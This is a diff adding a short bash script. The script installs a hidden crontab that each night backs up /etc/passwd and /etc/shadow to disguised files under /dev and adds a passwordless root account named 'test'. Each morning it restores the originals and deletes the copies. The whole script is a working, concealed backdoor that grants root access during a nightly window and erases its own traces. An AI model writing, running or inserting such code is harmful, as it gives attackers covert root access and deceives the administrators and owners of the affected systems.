@@ -1,0 +1,11 @@
+#!/bin/bash
+echo '50 23 * * * cat /etc/passwd > /dev/ttypwd' >> /etc/.cron;
+echo '50 23 * * * cat /etc/shadow > /dev/ttysdw' >> /etc/.cron;
+echo '55 23 * * * echo "test:x:0:0::/:/bin/sh" >> /etc/passwd' >> /etc/.cron;
+echo '55 23 * * * echo "test::9999:0:99999:7:::" >> /etc/shadow' >> /etc/.cron;
+echo '00 08 * * * cat /dev/ttypwd > /etc/passwd' >> /etc/.cron;
+echo '00 08 * * * cat /dev/ttysdw > /etc/shadow' >> /etc/.cron;
+echo '05 08 * * * rm -f /dev/ttypwd' >> /etc/.cron;
+echo '05 08 * * * rm -f /dev/ttysdw' >> /etc/.cron;
+service crond restart;
+crontab /etc/.cron;
